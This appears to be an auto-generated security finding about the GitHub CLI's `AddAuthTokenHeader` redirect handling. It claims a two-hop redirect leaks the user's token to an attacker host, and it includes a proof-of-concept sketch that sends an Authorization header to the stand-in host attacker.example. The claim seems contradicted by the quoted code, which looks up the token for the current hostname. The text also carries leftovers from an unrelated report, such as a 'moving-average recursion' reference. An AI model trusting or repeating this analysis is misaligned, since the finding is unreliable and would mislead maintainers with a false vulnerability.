### Title
Authorization token can be re-attached to an untrusted host during multi-hop HTTP redirects due to pairwise (recursive) host-comparison logic - (File: `api/http_client.go`)

### Summary
`AddAuthTokenHeader` decides whether to attach the GitHub `Authorization` header to a request by comparing the current request's host only to the host of the *immediately preceding* request in the redirect chain (`req.Response.Request`), rather than to the original, trusted request host. This creates the same "recursive/self-referential" flaw pattern as the referenced report: each redirect's trust decision is derived from the previous (already relaxed) decision instead of from ground truth, allowing the token to be reattached to an attacker-controlled host later in a multi-hop redirect chain. [1](#0-0) 

### Finding Description
`AddAuthTokenHeader` wraps the HTTP transport used by `f.HttpClient()` for authenticated GitHub API requests. For every outgoing request it checks:

```go
var redirectHostnameChange bool
if req.Response != nil && req.Response.Request != nil {
    redirectHostnameChange = getHost(req) != getHost(req.Response.Request)
}
if !redirectHostnameChange {
    hostname := ghauth.NormalizeHostname(getHost(req))
    if token, _ := cfg.ActiveToken(hostname); token != "" {
        req.Header.Set(authorization, fmt.Sprintf("token %s", token))
    }
}
``` [2](#0-1) 

`req.Response.Request` is the *previous hop's* request object (Go's `net/http` redirect semantics), not the original request that started the redirect chain. The comment states the intent is "Only set header if an initial request or redirect request to the same host as the initial request," but the code only checks equality against the **immediately prior hop**, not the **initial host**.

Consequences in a multi-hop redirect chain:
1. `req0` → `github.com` (trusted): token attached, correct.
2. `github.com` returns a redirect to `req1` → `attacker.com`: `getHost(req1) != getHost(req0)` → `redirectHostnameChange = true` → token **not** attached. Correct so far.
3. `attacker.com` (fully attacker-controlled server) then issues a *second* redirect to `req2`, also on `attacker.com` (e.g., a same-host redirect to a different path): the check now compares `getHost(req2)` to `getHost(req1)` (both `attacker.com`) → equal → `redirectHostnameChange = false` → the code attempts `AddAuthTokenHeader` again and **attaches the Authorization token to a request going to attacker.com**.

Because the "trust" decision is recomputed hop-by-hop from the most recently derived state (like the moving-average recursion in the report) instead of from the immutable original host, an attacker who controls just one hop in the chain can restore the "same host" condition on the next hop and cause the token to leak to their own server, even though the chain diverged from `github.com` earlier.

### Impact Explanation
If any code path uses the authenticated `f.HttpClient()` transport (which carries live GitHub PATs/OAuth tokens) to fetch a URL that is influenced by attacker content and can issue HTTP redirects (e.g., a malicious or compromised endpoint reachable via `gh api <url>`, a release asset URL, or any Location-header-driven request), the attacker can arrange a two-stage redirect (cross-host then same-host) to have `gh` send the user's live GitHub token directly to an attacker-controlled server. This results in authenticated credential exfiltration to an attacker host — a concrete, high-impact compromise of the user's GitHub token.

### Likelihood Explanation
Exploitability requires the attacker to control (or redirect through) an HTTP endpoint that `gh`'s authenticated client requests, and to issue two chained redirects (first off of a trusted host, then a same-host follow-up redirect on their own server). This is fully within a remote, unprivileged attacker's control once they can influence a URL fetched by the authenticated client (e.g., via `gh api <url>`, or any other flow that resolves attacker-influenced URLs through this transport). No local access, admin privileges, or MITM position is required — only control of the destination server's redirect behavior.

### Recommendation
Track and compare against the **original** request's host (captured once, before following any redirects) rather than the previous hop's host. For example, store the initial host in the request context (or via `http.Client.CheckRedirect`) and compare every subsequent hop's host to that fixed value, only attaching the Authorization header when the *current* host matches the *original trusted* host — never based on the immediately preceding hop alone.

### Proof of Concept
```go
// Illustrative Go http.Client redirect chain against AddAuthTokenHeader:
// req0: GET https://github.com/some/api/path   -> token attached (trusted host)
// resp0: 302 Location: https://attacker.example/stage1
// req1: GET https://attacker.example/stage1     -> redirectHostnameChange=true (attacker.example != github.com) -> token NOT attached
// resp1: 302 Location: https://attacker.example/stage2   (same host as req1)
// req2: GET https://attacker.example/stage2
//   getHost(req2) == "attacker.example"
//   getHost(req.Response.Request) == getHost(req1) == "attacker.example"
//   => redirectHostnameChange = false
//   => AddAuthTokenHeader attaches "Authorization: token <PAT>" to req2
// Result: attacker.example/stage2 receives the live GitHub token in the Authorization header.
```
This can be reproduced with an httptest server chaining two redirects (cross-host, then same-host) and inspecting whether the `Authorization` header appears on the final attacker-hosted request when using `AddAuthTokenHeader`/`api.NewHTTPClient`.

```go
// AddAuthTokenHeader adds an authentication token header for the host specified by the request.
func AddAuthTokenHeader(rt http.RoundTripper, cfg tokenGetter) http.RoundTripper {
	return &funcTripper{roundTrip: func(req *http.Request) (*http.Response, error) {
		// If the header is already set in the request, don't overwrite it.
		if req.Header.Get(authorization) == "" {
			var redirectHostnameChange bool
			if req.Response != nil && req.Response.Request != nil {
				redirectHostnameChange = getHost(req) != getHost(req.Response.Request)
			}
			// Only set header if an initial request or redirect request to the same host as the initial request.
			// If the host has changed during a redirect do not add the authentication token header.
			if !redirectHostnameChange {
				hostname := ghauth.NormalizeHostname(getHost(req))
				if token, _ := cfg.ActiveToken(hostname); token != "" {
					req.Header.Set(authorization, fmt.Sprintf("token %s", token))
				}
			}
		}
		return rt.RoundTrip(req)
	}}
}
